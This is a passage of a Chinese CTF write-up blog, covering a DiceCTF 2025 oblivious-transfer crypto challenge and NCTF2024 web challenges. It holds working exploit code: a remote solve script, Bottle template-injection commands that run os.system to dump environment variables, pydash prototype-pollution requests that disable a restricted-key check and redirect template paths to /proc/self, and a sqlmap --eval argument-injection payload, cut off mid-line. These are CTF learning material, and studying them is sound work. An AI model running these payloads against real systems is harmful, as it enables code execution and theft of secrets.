leg&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;a broken arm&#x27;</span>,</span><br><span class="line"><span class="string">&#x27;drowning&#x27;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">encrypt</span>(<span class="params">k, msg</span>):</span><br><span class="line">key = k.to_bytes(<span class="number">1024</span>//<span class="number">8</span>, <span class="string">&#x27;big&#x27;</span>)</span><br><span class="line">msg = msg.encode().ljust(<span class="number">64</span>, <span class="string">b&#x27;\x00&#x27;</span>)</span><br><span class="line">pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(msg))</span><br><span class="line"><span class="keyword">return</span> strxor(pad, msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">run_ot</span>(<span class="params">key, msg0, msg1</span>):</span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">https://en.wikipedia.org/wiki/Oblivious_transfer#1–2_oblivious_transfer</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line">x0 = secrets.randbelow(key.n)</span><br><span class="line">x1 = secrets.randbelow(key.n)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;n: <span class="subst">&#123;key.n&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;e: <span class="subst">&#123;key.e&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x0: <span class="subst">&#123;x0&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;x1: <span class="subst">&#123;x1&#125;</span>&#x27;</span>)</span><br><span class="line">v = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;v: &#x27;</span>))</span><br><span class="line"><span class="keyword">assert</span> <span class="number">0</span> &lt;= v &lt; key.n, <span class="string">&#x27;invalid value&#x27;</span></span><br><span class="line">k0 = <span class="built_in">pow</span>(v - x0, key.d, key.n)</span><br><span class="line">k1 = <span class="built_in">pow</span>(v - x1, key.d, key.n)</span><br><span class="line">c0 = encrypt(k0, msg0)</span><br><span class="line">c1 = encrypt(k1, msg1)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c0: <span class="subst">&#123;c0.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c1: <span class="subst">&#123;c1.<span class="built_in">hex</span>()&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;flag.txt&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">flag = f.read().strip()</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;key.pem&#x27;</span>, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">key = RSA.import_key(f.read())</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;=== CHOOSE YOUR OWN ADVENTURE: Winxy Pistol Edition ===&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;you enter a cave.&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the tunnel forks ahead. do you take the left or right path?&#x27;</span>)</span><br><span class="line">msgs = [<span class="literal">None</span>, <span class="literal">None</span>]</span><br><span class="line">page = secrets.randbits(<span class="number">32</span>)</span><br><span class="line">live = <span class="string">f&#x27;you continue walking. turn to page <span class="subst">&#123;page&#125;</span>.&#x27;</span></span><br><span class="line">die = <span class="string">f&#x27;you die of <span class="subst">&#123;secrets.choice(DEATH_CAUSES)&#125;</span>.&#x27;</span></span><br><span class="line">msgs = (live, die) <span class="keyword">if</span> secrets.randbits(<span class="number">1</span>) <span class="keyword">else</span> (die, live)</span><br><span class="line">run_ot(key, *msgs)</span><br><span class="line">page_guess = <span class="built_in">int</span>(<span class="built_in">input</span>(<span class="string">&#x27;turn to page: &#x27;</span>))</span><br><span class="line"><span class="keyword">if</span> page_guess != page:</span><br><span class="line">exit()</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;you find a chest containing <span class="subst">&#123;flag&#125;</span>&#x27;</span>)</span><br></pre></td></tr></table></figure><p>诶，才发现这题是上一题的加强版吧，但下班睡觉了</p><p><code>c0,c1</code>的加密方式改为<code>shake_256(key)</code>与异或，关键的一点是<strong>rsa的参数固定了</strong></p><p>赛后再来学一手，文档里面沛公写的思路太简洁了，又参考了一下<a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/#winxy-pistol">maple3142师傅的wp</a>才搞懂，确实是需要开多线程</p><p>思路如下：首先令<code>v = x0</code>，<code>k0 = 0</code>，$k1\equiv(v-x1)^{d}mod\ n$</p><p>然后我们再开一个进程，令$k0’\equiv(v’-x0’)^{d}\equiv(v-x1)^{d}mod\ n\equiv k1$</p><p>那么，<code>v&#39; = v + x0&#39; - x1</code></p><p>此时我们可以先假设<code>m0 = die</code>，$c0’\oplus c1=m0’\oplus m1$</p><p>然后因为是异或算法，有二分之一的概率<code>m1</code>的<code>page</code>会被异或掉，但如果<code>m0&#39; = die</code>，二者异或的话，因为<code>die</code>的死法比较短并且进行的是<strong>零填充</strong>，所以是可以拿到<code>page</code>的</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> hashlib</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.strxor <span class="keyword">import</span> strxor</span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> context, remote</span><br><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> trange</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">k, ct</span>):</span><br><span class="line">    key = k.to_bytes(<span class="number">1024</span> // <span class="number">8</span>, <span class="string">&quot;big&quot;</span>)</span><br><span class="line">    pad = hashlib.shake_256(key).digest(<span class="built_in">len</span>(ct))</span><br><span class="line">    <span class="keyword">return</span> strxor(pad, ct)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">connect</span>():</span><br><span class="line">    io = remote(<span class="string">&quot;dicec.tf&quot;</span>, <span class="number">31002</span>)</span><br><span class="line">    <span class="keyword">return</span> io</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">recv</span>(<span class="params">io</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;n: &quot;</span>)</span><br><span class="line">    n = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;e: &quot;</span>)</span><br><span class="line">    e = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x0: &quot;</span>)</span><br><span class="line">    x0 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;x1: &quot;</span>)</span><br><span class="line">    x1 = <span class="built_in">int</span>(io.recvline().strip())</span><br><span class="line">    <span class="keyword">return</span> n, e, x0, x1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">ot</span>(<span class="params">io, v</span>):</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;v: &quot;</span>, <span class="built_in">str</span>(v).encode())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c0: &quot;</span>)</span><br><span class="line">    c0 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    io.recvuntil(<span class="string">b&quot;c1: &quot;</span>)</span><br><span class="line">    c1 = <span class="built_in">bytes</span>.fromhex(io.recvlineS().strip())</span><br><span class="line">    <span class="keyword">return</span> c0, c1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">PAGE_RE = re.<span class="built_in">compile</span>(<span class="string">rb&quot;page (\d+)&quot;</span>)</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&quot;error&quot;</span></span><br><span class="line">io = connect()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> _ <span class="keyword">in</span> trange(<span class="number">64</span>):</span><br><span class="line">    n, e, x0, x1 = recv(io)</span><br><span class="line">    v = x0</span><br><span class="line">    c0, c1 = ot(io, v)</span><br><span class="line">    k0 = <span class="number">0</span></span><br><span class="line">    m0 = decrypt(k0, c0)</span><br><span class="line">    <span class="keyword">if</span> m0.startswith(<span class="string">b&quot;you die of &quot;</span>):</span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            io2 = connect()</span><br><span class="line">            _, _, x0p, _ = recv(io2)</span><br><span class="line">            vp = (v - x1 + x0p) % n</span><br><span class="line">            c0p, _ = ot(io2, vp)</span><br><span class="line">            io2.close()</span><br><span class="line">            m1xorm0p = strxor(c0p, c1)</span><br><span class="line">            <span class="comment"># we hope m0&#x27; is short (death), so the page part will not be xored</span></span><br><span class="line">            <span class="comment"># probability: 1/2</span></span><br><span class="line">            <span class="keyword">if</span> <span class="string">b&quot;page&quot;</span> <span class="keyword">in</span> m1xorm0p:</span><br><span class="line">                page = <span class="built_in">int</span>(PAGE_RE.search(m1xorm0p).group(<span class="number">1</span>))</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        page = <span class="built_in">int</span>(PAGE_RE.search(m0).group(<span class="number">1</span>))</span><br><span class="line">    io.sendlineafter(<span class="string">b&quot;page: &quot;</span>, <span class="built_in">str</span>(page).encode())</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure><p><code>you find a chest containing dice&#123;lu5tr0us_j3wel_tr1nk3t&#125;</code></p><p>奇怪的是，我也是按照这个思路写的<code>exp</code>，感觉是因为进程的问题，导致跑几下就报错断开了，改了好多遍还是无法解决……<br><img src="https://pica.zhimg.com/80/v2-0d370d7d3fdca18e533722ee59a2fe0a_1440w.png" alt=""></p><h2 id="satisfied-unsolved"><a href="#satisfied-unsolved" class="headerlink" title="satisfied(unsolved)"></a>satisfied(unsolved)</h2><blockquote><p>you don’t even know what you’re asking me to confess</p></blockquote><p>看了一下春哥的思路，<strong>可能是cryptohack里面哈密顿回路ZKP</strong>，好吧，不懂，下班</p><h1 id="参考学习"><a href="#参考学习" class="headerlink" title="参考学习"></a>参考学习</h1><p><a href="https://blog.maple3142.net/2025/03/31/dicectf-2025-quals-writeups/">野生大佬wp</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;Web&quot;&gt;&lt;a href=&quot;#Web&quot; class=&quot;headerlink&quot; title=&quot;Web&quot;&gt;&lt;/a&gt;Web&lt;/h1&gt;&lt;h2 id=&quot;cookie-recipes-v3&quot;&gt;&lt;a href=&quot;#cookie-recipes-v3&quot; class=&quot;header</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>NCTF2024-WriteUp</title>
    <link href="https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/"/>
    <id>https://hvang10.github.io/2025/03/23/NCTF2024-WriteUp/</id>
    <published>2025-03-22T16:43:10.000Z</published>
    <updated>2025-03-28T02:59:28.386Z</updated>
    
    <content type="html"><![CDATA[<p>放在最前面，<a href="https://o1r4dlnbgzn.feishu.cn/docx/JtOBd2LZXocQQmxz099cuUTLnLh">laogong的wp</a></p><h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="ez-dash-amp-amp-ez-dash-revenge复现"><a href="#ez-dash-amp-amp-ez-dash-revenge复现" class="headerlink" title="ez_dash &amp;&amp; ez_dash revenge复现"></a>ez_dash &amp;&amp; ez_dash revenge复现</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">Hints: Flag在环境变量中</span></span><br><span class="line"><span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">from</span> typing <span class="keyword">import</span> <span class="type">Optional</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"><span class="keyword">import</span> bottle</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">__forbidden_path__=[<span class="string">&#x27;__annotations__&#x27;</span>, <span class="string">&#x27;__call__&#x27;</span>, <span class="string">&#x27;__class__&#x27;</span>, <span class="string">&#x27;__closure__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__code__&#x27;</span>, <span class="string">&#x27;__defaults__&#x27;</span>, <span class="string">&#x27;__delattr__&#x27;</span>, <span class="string">&#x27;__dict__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__dir__&#x27;</span>, <span class="string">&#x27;__doc__&#x27;</span>, <span class="string">&#x27;__eq__&#x27;</span>, <span class="string">&#x27;__format__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__ge__&#x27;</span>, <span class="string">&#x27;__get__&#x27;</span>, <span class="string">&#x27;__getattribute__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__gt__&#x27;</span>, <span class="string">&#x27;__hash__&#x27;</span>, <span class="string">&#x27;__init__&#x27;</span>, <span class="string">&#x27;__init_subclass__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__kwdefaults__&#x27;</span>, <span class="string">&#x27;__le__&#x27;</span>, <span class="string">&#x27;__lt__&#x27;</span>, <span class="string">&#x27;__module__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__name__&#x27;</span>, <span class="string">&#x27;__ne__&#x27;</span>, <span class="string">&#x27;__new__&#x27;</span>, <span class="string">&#x27;__qualname__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__reduce__&#x27;</span>, <span class="string">&#x27;__reduce_ex__&#x27;</span>, <span class="string">&#x27;__repr__&#x27;</span>, <span class="string">&#x27;__setattr__&#x27;</span>,</span><br><span class="line">               <span class="string">&#x27;__sizeof__&#x27;</span>, <span class="string">&#x27;__str__&#x27;</span>, <span class="string">&#x27;__subclasshook__&#x27;</span>, <span class="string">&#x27;__wrapped__&#x27;</span>,</span><br><span class="line">               <span class="string">&quot;Optional&quot;</span>,<span class="string">&quot;func&quot;</span>,<span class="string">&quot;render&quot;</span>,</span><br><span class="line">               ]</span><br><span class="line">__forbidden_name__=[</span><br><span class="line">    <span class="string">&quot;bottle&quot;</span></span><br><span class="line">]</span><br><span class="line">__forbidden_name__.extend(<span class="built_in">dir</span>(<span class="built_in">globals</span>()[<span class="string">&quot;__builtins__&quot;</span>]))</span><br><span class="line"><span class="comment"># 这里会禁掉Python的所有内置函数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">setval</span>(<span class="params">name:<span class="built_in">str</span>, path:<span class="built_in">str</span>, value:<span class="built_in">str</span></span>)-&gt; <span class="type">Optional</span>[<span class="built_in">bool</span>]:</span><br><span class="line">    <span class="keyword">if</span> name.find(<span class="string">&quot;__&quot;</span>)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_name__:</span><br><span class="line">        <span class="keyword">if</span> name==word:</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">for</span> word <span class="keyword">in</span> __forbidden_path__:</span><br><span class="line">        <span class="keyword">if</span> path.find(word)&gt;=<span class="number">0</span>: <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    obj=<span class="built_in">globals</span>()[name]</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pydash.set_(obj,path,value)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.post(<span class="params"><span class="string">&#x27;/setValue&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">set_value</span>():</span><br><span class="line">    name = bottle.request.query.get(<span class="string">&#x27;name&#x27;</span>)</span><br><span class="line">    path=bottle.request.json.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">isinstance</span>(path,<span class="built_in">str</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(name)&gt;<span class="number">6</span> <span class="keyword">or</span> <span class="built_in">len</span>(path)&gt;<span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;no&quot;</span></span><br><span class="line">    value=bottle.request.json.get(<span class="string">&#x27;value&#x27;</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;yes&quot;</span> <span class="keyword">if</span> setval(name, path, value) <span class="keyword">else</span> <span class="string">&quot;no&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> path.find(<span class="string">&quot;&#123;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;&#125;&quot;</span>)&gt;=<span class="number">0</span> <span class="keyword">or</span> path.find(<span class="string">&quot;.&quot;</span>)&gt;=<span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>看前面的黑名单，预期解应该是打<a href="https://furina.org.cn/2023/12/18/prototype-pollution-in-pydash-ctf/">pydash原型链污染</a>，但是没能参考上</p><p>非预期，打<code>Bottle模板注入</code>，上周<code>GHCTF2025</code>刚打过一次，但是过滤了<code>&#123;&#125;.</code>，可以绕一下<code>os.system()</code><br><code>%</code>开始可以<strong>嵌入python代码执行</strong>，<code>&lt;%xxx%&gt;</code>是嵌入代码块，因为页面没有回显需要重定向，然后文件包含读取(一开始犯病了，想访问<code>/render/1</code>，应该是没有读取权限？然后才想起了<code>include</code>)</p><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">/render?path=%getattr(__import__(<span class="string">&#x27;os&#x27;</span>), <span class="string">&#x27;system&#x27;</span>)(<span class="string">&#x27;env &gt; 1&#x27;</span>)</span><br><span class="line">/render?path=%include(<span class="string">&quot;1&quot;</span>)</span><br></pre></td></tr></table></figure><p>这里也可以通过<code>/render</code>路由<strong>渲染当前路径下的文件</strong>，<code>?path=1</code></p><p>赛后再来学一下怎么实现<strong>原型链污染</strong></p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="meta">@bottle.get(<span class="params"><span class="string">&#x27;/render&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">render_template</span>():</span><br><span class="line">    path=bottle.request.query.get(<span class="string">&#x27;path&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> <span class="built_in">len</span>(path)&gt;<span class="number">10</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    blacklist=[<span class="string">&quot;&#123;&quot;</span>,<span class="string">&quot;&#125;&quot;</span>,<span class="string">&quot;.&quot;</span>,<span class="string">&quot;%&quot;</span>,<span class="string">&quot;&lt;&quot;</span>,<span class="string">&quot;&gt;&quot;</span>,<span class="string">&quot;_&quot;</span>] </span><br><span class="line">    <span class="keyword">for</span> c <span class="keyword">in</span> path:</span><br><span class="line">        <span class="keyword">if</span> c <span class="keyword">in</span> blacklist:</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;hacker&quot;</span></span><br><span class="line">    <span class="keyword">return</span> bottle.template(path)</span><br><span class="line">bottle.run(host=<span class="string">&#x27;0.0.0.0&#x27;</span>, port=<span class="number">8000</span>)</span><br></pre></td></tr></table></figure><p>这里修复了非预期，为了深入学习一下，参考<a href="https://err0r233.github.io/posts/32411.html">深大爷Err0r233</a><br>我们本地是有下载<code>bottle</code>的，可以在<code>vscode</code>试着跟进源码看看<code>bottle</code>是怎么实现渲染的</p><p>具体原理得细读师傅的文章，这里直接提炼一下</p><p><code>bottle.template</code>可以实现模板文件渲染，<code>template</code>的第一个参数<code>tpl</code>，如果含有<code>\n、&#123;、%、$</code>的能够加入<code>TEMPLATES[tplid]</code>，后续能够直接渲染它，否则会将其作为模板的名字，尝试寻找对应的模板文件渲染，而它会根据<code>TEMPLATE_PATH</code>里去找到<br><code>lookup = kwargs.pop(&#39;template_lookup&#39;, TEMPLATE_PATH</code></p><p>这里因为过滤了<code>&#123;&#125;</code>，无法直接渲染，我们只能通过污染<code>TEMPLATE_PATH</code>实现任意文件读</p><p><code>pydash.set_(obj,path,value)</code>是可以<strong>修改对象属性</strong>的</p><p>污染的效果是这样<code>setval.__globals__.bottle.TEMPLATE=[&#39;/proc/self&#39;]</code></p><p>官方这样解释的<code>pydash不允许去修改__globals__属性</code></p><p><code>pydash</code>的版本是<code>8.0.5</code>(也可以通过非预期看一手)，因此不能够直接通过<code>__globals__</code>去获得<code>bottle</code>，在<code>pydash 5.1.2</code>版本中能够使用<code>__globals__</code>，但是高版本下已经被修复了，现在会报<code>access to restricted key __globals__</code>，因此要想办法绕过<code>restricted key</code></p><p>可以发现该异常只有输入在<code>RESTRICTED_KEYS</code><strong>中的内容</strong>时才会触发：</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#pydash.helpper</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_raise_if_restricted_key</span>(<span class="params">key</span>):</span><br><span class="line">    <span class="keyword">if</span> key <span class="keyword">in</span> RESTRICTED_KEYS:</span><br><span class="line">        <span class="keyword">raise</span> KeyError(<span class="string">f&quot;access to restricted key <span class="subst">&#123;key!r&#125;</span> is not allowed&quot;</span>)</span><br></pre></td></tr></table></figure><p><code>RESTRICTED_KEYS = (&quot;__globals__&quot;, &quot;__builtins__&quot;)</code></p><p>所以，可以通过<code>pydash</code>自己污染掉<code>RESTRICTED_KEYS</code>从而使用<code>globals</code>(这里是因为污染为空，就没有不允许修改<code>__globals__</code>的属性的限制了，之后就可以<strong>自己修改</strong><code>__globals__</code>的属性了)</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=pydash</span><br><span class="line"></span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><p>然后再污染<code>TEMPLATE_PATH</code>为<code>/proc/self</code>，我们即可通过<code>/render?path=environ</code>将环境变量渲染出来了</p><figure class="highlight json"><table><tr><td class="code"><pre><span class="line">POST /setValue?name=setval</span><br><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;path&quot;</span><span class="punctuation">:</span><span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;value&quot;</span><span class="punctuation">:</span><span class="punctuation">[</span><span class="string">&quot;/proc/self&quot;</span><span class="punctuation">]</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://39.106.16.204:20055/&quot;</span></span><br><span class="line">a1 = requests.post(url+<span class="string">&quot;setValue?name=pydash&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;helpers.RESTRICTED_KEYS&quot;</span>, <span class="string">&quot;value&quot;</span>: []&#125;)</span><br><span class="line"></span><br><span class="line">a2 = requests.post(url+<span class="string">&quot;setValue?name=setval&quot;</span>,</span><br><span class="line">                   json=&#123;<span class="string">&quot;path&quot;</span>: <span class="string">&quot;__globals__.bottle.TEMPLATE_PATH&quot;</span>, <span class="string">&quot;value&quot;</span>: [<span class="string">&quot;/proc/self&quot;</span>]&#125;)</span><br><span class="line"></span><br><span class="line">a3 = requests.get(url+<span class="string">&quot;render?path=environ&quot;</span>)</span><br><span class="line"><span class="built_in">print</span>(a3.text)</span><br></pre></td></tr></table></figure><h2 id="sqlmap-master"><a href="#sqlmap-master" class="headerlink" title="sqlmap-master"></a>sqlmap-master</h2><figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> fastapi <span class="keyword">import</span> FastAPI, Request</span><br><span class="line"><span class="keyword">from</span> fastapi.responses <span class="keyword">import</span> FileResponse, StreamingResponse</span><br><span class="line"><span class="keyword">import</span> subprocess</span><br><span class="line"></span><br><span class="line">app = FastAPI()</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.get(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> FileResponse(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.post(<span class="params"><span class="string">&quot;/run&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">async</span> <span class="keyword">def</span> <span class="title function_">run</span>(<span class="params">request: Request</span>):</span><br><span class="line">    data = <span class="keyword">await</span> request.json()</span><br><span class="line">    url = data.get(<span class="string">&quot;url&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> url:</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;error&quot;</span>: <span class="string">&quot;URL is required&quot;</span>&#125;</span><br><span class="line">    </span><br><span class="line">    command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            output = process.stdout.readline()</span><br><span class="line">            <span class="keyword">if</span> output == <span class="string">&#x27;&#x27;</span> <span class="keyword">and</span> process.poll() <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">if</span> output:</span><br><span class="line">                <span class="keyword">yield</span> output</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> StreamingResponse(generate(), media_type=<span class="string">&quot;text/plain&quot;</span>)</span><br></pre></td></tr></table></figure><p>关键在</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">command = <span class="string">f&#x27;sqlmap -u <span class="subst">&#123;url&#125;</span> --batch --flush-session&#x27;</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">generate</span>():</span><br><span class="line">        process = subprocess.Popen(</span><br><span class="line">            command.split(),</span><br><span class="line">            stdout=subprocess.PIPE,</span><br><span class="line">            stderr=subprocess.STDOUT,</span><br><span class="line">            shell=<span class="literal">False</span></span><br><span class="line">        )</span><br></pre></td></tr></table></figure><p><strong>shell=True参数会让subprocess.call接受字符串类型的变量作为命令，并调用shell去执行这个字符串，当shell=False是，subprocess.call只接受数组变量作为命令，并将数组的第一个元素作为命令，剩下的全部作为该命令的参数</strong></p><p>所以这里不能拼接命令执行了，<code>command.split()</code>，只能利用<code>sqlmap</code>的参数<br><code>compose.yml</code>告诉我们<code>flag</code>在<strong>环境变量</strong>里面<code>FLAG</code></p><p>emmmm，对<code>sqlmap</code>的参数不太了解，<code>--file-read</code>这些都不行<br>说实话，命令有点多，没翻到<code>--eval</code></p><p>比赛结束后，找到一篇<a href="https://hadagaga.github.io/p/2024-nctf-%E4%B8%AA%E4%BA%BAwp/#sqlmap-master">wp</a>学习一下<br>主要用到了两个参数，还要绕空格(不然参数会被分割)</p><figure class="highlight py"><table><tr><td class="code"><pre><span class="line">--<span class="built_in">eval</span>：动态运行任意的 Python 代码</span><br><span class="line">-c CONFIGFILE：从ini文件中加载选项</span><br></pre></td></tr></table></figure><figure class="highlight sql"><table><tr><td class="code"><pre><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="comment">--eval eval(&quot;__import__(&#x27;os&#x27;).system(&#x27;echo$IFS$FLAG&gt;&gt;114514&#x27;)&quot;)</span></span><br><span class="line"><span class="number">127.0</span><span class="number">.0</span><span class="number">.1</span> <span class="operator">-</span>c <span 